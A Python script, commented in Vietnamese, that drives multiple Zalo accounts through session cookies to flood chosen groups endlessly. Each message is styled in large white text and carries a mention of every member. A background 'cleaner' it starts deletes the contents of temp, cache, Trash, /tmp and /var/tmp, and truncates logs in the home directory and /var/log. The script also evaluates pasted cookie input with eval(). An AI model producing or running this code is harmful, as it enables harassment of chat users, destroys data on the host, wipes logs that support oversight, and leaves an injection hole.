import multiprocessing
import threading
import time
import os
import gc
import shutil
import tempfile
import glob
from zlapi import ZaloAPI, ThreadType, Message, Mention, MultiMsgStyle, MessageStyle

def auto_resource_cleaner(interval=300):
    while True:
        try:
            collected = gc.collect()
            deleted_files = 0
            freed_bytes = 0
            temp_dir = tempfile.gettempdir()
            try:
                for fname in os.listdir(temp_dir):
                    fpath = os.path.join(temp_dir, fname)
                    try:
                        size = os.path.getsize(fpath) if os.path.isfile(fpath) else 0
                        if os.path.isfile(fpath) or os.path.islink(fpath):
                            os.unlink(fpath)
                            deleted_files += 1
                            freed_bytes += size
                        elif os.path.isdir(fpath):
                            freed_bytes += sum(
                                os.path.getsize(os.path.join(dp, f))
                                for dp, dn, fn in os.walk(fpath)
                                for f in fn
                                if os.path.exists(os.path.join(dp, f))
                            )
                            shutil.rmtree(fpath, ignore_errors=True)
                            deleted_files += 1
                    except Exception:
                        pass
            except Exception:
                pass
            cache_dirs = [
                os.path.expanduser("~/.cache"),
                os.path.expanduser("~/.local/share/Trash"),
                "/tmp",
                "/var/tmp",
            ]
            for cdir in cache_dirs:
                if not os.path.isdir(cdir):
                    continue
                try:
                    for fname in os.listdir(cdir):
                        fpath = os.path.join(cdir, fname)
                        try:
                            size = os.path.getsize(fpath) if os.path.isfile(fpath) else 0
                            if os.path.isfile(fpath) or os.path.islink(fpath):
                                os.unlink(fpath)
                                deleted_files += 1
                                freed_bytes += size
                            elif os.path.isdir(fpath):
                                freed_bytes += sum(
                                    os.path.getsize(os.path.join(dp, f))
                                    for dp, dn, fn in os.walk(fpath)
                                    for f in fn
                                    if os.path.exists(os.path.join(dp, f))
                                )
                                shutil.rmtree(fpath, ignore_errors=True)
                                deleted_files += 1
                        except Exception:
                            pass
                except Exception:
                    pass
            log_patterns = [
                os.path.expanduser("~/*.log"),
                os.path.expanduser("~/**/*.log"),
                "/var/log/*.log",
                "/var/log/*.gz",
                "/var/log/*.old",
            ]
            for pattern in log_patterns:
                try:
                    for fpath in glob.glob(pattern, recursive=True):
                        try:
                            size = os.path.getsize(fpath)
                            if size > 1024 * 1024:
                                with open(fpath, 'w') as f:
                                    f.truncate(0)
                                freed_bytes += size
                                deleted_files += 1
                        except Exception:
                            pass
                except Exception:
                    pass
            freed_mb = freed_bytes / (1024 * 1024)
            print(f"[🧹 CLEANER] GC: {collected} obj | Files: {deleted_files} | Freed: {freed_mb:.2f} MB | {time.strftime('%H:%M:%S')}")
        except Exception as e:
            print(f"[⚠️ CLEANER] Lỗi: {e}")
        time.sleep(interval)

def start_cleaner(interval=300):
    t = threading.Thread(target=auto_resource_cleaner, args=(interval,), daemon=True)
    t.start()
    print(f"[✅ CLEANER] Đã khởi động dọn dẹp tự động mỗi {interval}s")

def custom_print(text):
    print(text)

def read_file_content(filename):
    try:
        with open(filename, "r", encoding="utf-8") as file:
            return file.read().strip()
    except Exception as e:
        custom_print(f"Lỗi đọc file {filename}: {e}")
        return ""

def parse_selection(input_str, max_index):
    try:
        numbers = [int(i.strip()) for i in input_str.split(',')]
        return [n for n in numbers if 1 <= n <= max_index]
    except:
        custom_print("Định dạng không hợp lệ!")
        return []

class Bot(ZaloAPI):
    def __init__(self, api_key, secret_key, imei, session_cookies, mode="treongon", delay_min=0, message_text=""):
        super().__init__(api_key, secret_key, imei, session_cookies)
        self.mode = mode
        self.delay_min = delay_min
        self.message_text = message_text
        self.ttl = None
        self.color_choices = [5]
        self.media_type = "text"
        self.running_flags = {}
        self.processes = {}
        self.color_map = {
            1: "#db342e",
            2: "#f27806",
            3: "#f7b503",
            4: "#15a85f",
            5: "#ffffff",
        }

    def start_spam(self, thread_id, thread_type):
        if not self.message_text:
            custom_print("Nội dung spam rỗng!")
            return
        if thread_id not in self.running_flags:
            self.running_flags[thread_id] = multiprocessing.Value('b', False)
        if thread_id not in self.processes:
            self.processes[thread_id] = None
        if not self.running_flags[thread_id].value:
            self.send(Message(text=""), thread_id, thread_type)
            self.running_flags[thread_id].value = True
            self.processes[thread_id] = multiprocessing.Process(
                target=self.spam_messages_treongon,
                args=(thread_id, thread_type, self.running_flags[thread_id])
            )
            self.processes[thread_id].start()

    def spam_messages_treongon(self, thread_id, thread_type, running_flag):
        style = MultiMsgStyle(
            [
                MessageStyle(offset=0, length=1000, style="color", color="#ffffff", auto_format=False),
                MessageStyle(offset=0, length=1000, style="font", size="40", auto_format=False),
            ]
        )
        while running_flag.value:
            try:
                self.setTyping(thread_id, thread_type)
                time.sleep(1)
                mention = Mention("-1", length=1000000, offset=0) if self.message_text else None
                self.send(
                    Message(text=self.message_text, mention=mention, style=style),
                    thread_id=thread_id,
                    thread_type=thread_type
                )
            except Exception as e:
                custom_print(f"Lỗi gửi tin nhắn: {e}")
            time.sleep(self.delay_min)

    def onMessage(self, *args, **kwargs):
        pass

    def onEvent(self, *args, **kwargs):
        pass

    def onAdminMessage(self, *args, **kwargs):
        pass

    def fetch_groups(self):
        try:
            all_groups = self.fetchAllGroups()
            group_list = []
            for group_id, _ in all_groups.gridVerMap.items():
                group_info = self.fetchGroupInfo(group_id)
                group_name = group_info.gridInfoMap[group_id]["name"]
                group_list.append({'id': group_id, 'name': group_name})
            return type('GroupObj', (), {'groups': [type('GroupItem', (), {'grid': g['id'], 'name': g['name']})() for g in group_list]})()
        except AttributeError as e:
            custom_print(f"Lỗi: Phương thức hoặc thuộc tính không tồn tại: {e}")
            return None
        except Exception as e:
            custom_print(f"Lỗi không xác định khi lấy danh sách nhóm: {e}")
            return None

def start_bot_treongon(api_key, secret_key, imei, session_cookies, message_text, delay, group_ids):
    bot = Bot(api_key, secret_key, imei, session_cookies, mode="treongon", delay_min=delay, message_text=message_text)
    for group_id in group_ids:
        custom_print(f"Bắt đầu treo ngôn nhóm {group_id}")
        bot.start_spam(group_id, ThreadType.GROUP)
    bot.listen(run_forever=True, thread=False, delay=1, type='requests')

def start_multiple_accounts():
    start_cleaner(interval=300)
    while True:
        while True:
            try:
                num_accounts = int(input("💠 Nhập số lượng tài khoản Zalo muốn chạy: "))
                if num_accounts <= 0:
                    custom_print("Số tài khoản phải lớn hơn 0, nhập lại!")
                    continue
                break
            except ValueError:
                custom_print("Nhập sai, phải là số nguyên, nhập lại!")
        processes = []
        for i in range(num_accounts):
            print(f"\nNhập thông tin cho tài khoản {i+1}")
            while True:
                imei = input("📱 Nhập IMEI của Zalo: ").strip()
                if imei:
                    break
                custom_print("IMEI không được để trống, nhập lại!")
            while True:
                cookie_str = input("🍪 Nhập Cookie: ").strip()
                if not cookie_str:
                    custom_print("Cookie không được để trống, nhập lại!")
                    continue
                try:
                    session_cookies = eval(cookie_str)
                    if not isinstance(session_cookies, dict):
                        custom_print("Cookie phải là dictionary, nhập lại!")
                        continue
                    break
                except:
                    custom_print("Cookie không hợp lệ, dùng dạng {'key': 'value'}, nhập lại!")
            try:
                bot = Bot('api_key', 'secret_key', imei, session_cookies, mode="treongon")
            except Exception as e:
                custom_print(f"❌ Tài khoản {i+1} die/cookie hết hạn, bỏ qua! ({e})")
                continue
            groups = None
            try:
                groups = bot.fetch_groups()
            except Exception as e:
                custom_print(f"❌ Tài khoản {i+1} die/cookie hết hạn, bỏ qua! ({e})")
                continue
            if not groups or not hasattr(groups, 'groups') or not groups.groups:
                custom_print(f"❌ Tài khoản {i+1} không lấy được nhóm, bỏ qua!")
                continue
            print("\nDanh sách nhóm:")
            for idx, group in enumerate(groups.groups, 1):
                print(f"{idx}. {group.name} (ID: {group.grid})")
            while True:
                raw = input("🔸 Nhập số nhóm muốn chạy (VD: 1,3): ")
                selected = parse_selection(raw, len(groups.groups))
                if selected:
                    break
                custom_print("Không hợp lệ, nhập lại (VD: 1,3)!")
            selected_ids = [groups.groups[i - 1].grid for i in selected]
            while True:
                file_txt = input("📂 Nhập tên file .txt chứa nội dung spam: ").strip()
                if not file_txt:
                    custom_print("Tên file không được để trống, nhập lại!")
                    continue
                if not os.path.isfile(file_txt):
                    custom_print(f"File '{file_txt}' không tồn tại, nhập lại!")
                    continue
                message_text = read_file_content(file_txt)
                if not message_text:
                    custom_print("File rỗng, nhập lại!")
                    continue
                break
            while True:
                try:
                    delay = float(input("⏳ Nhập delay giữa các lần gửi (giây): "))
                    if delay < 0:
                        custom_print("Delay phải không âm, nhập lại!")
                        continue
                    break
                except ValueError:
                    custom_print("Delay phải là số, nhập lại!")
            p = multiprocessing.Process(
                target=start_bot_treongon,
                args=('api_key', 'secret_key', imei, session_cookies, message_text, delay, selected_ids)
            )
            processes.append(p)
            p.start()
        custom_print("\nTẤT CẢ ACCOUNT ĐÃ KHỞI ĐỘNG THÀNH CÔNG")
        while True:
            restart = input("🔄 Bạn muốn dùng lại tool? (Y/N): ").lower()
            if restart in ['y', 'n']:
                break
            custom_print("Vui lòng nhập Y hoặc N!")
        if restart == 'y':
            continue
        else:
            custom_print("\n👋 Chào tạm biệt!")
            break

if __name__ == "__main__":
    start_multiple_accounts()
